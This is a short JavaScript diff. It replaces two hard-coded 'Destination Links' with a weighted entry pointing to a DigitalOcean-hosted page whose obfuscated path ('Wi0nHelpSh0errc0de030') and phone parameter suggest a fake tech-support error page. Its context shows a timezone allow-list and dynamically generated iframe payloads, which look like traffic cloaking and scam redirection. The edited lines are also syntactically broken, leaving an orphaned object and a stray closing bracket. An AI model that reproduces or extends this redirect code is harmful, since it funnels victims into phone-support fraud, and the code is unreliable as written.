@@ -42,8 +42,9 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://oyster-app-ciif4.ondigitalocean.app/Ma0cHelpSh0errc0de030/index.html?Anph=1800-034-661";
-const LINK_OTHERS = "https://oyster-app-ciif4.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+{ url: "https://oyster-app-ciif4.ondigitalocean.app/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661", weight: 1.0 }
+
+];
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
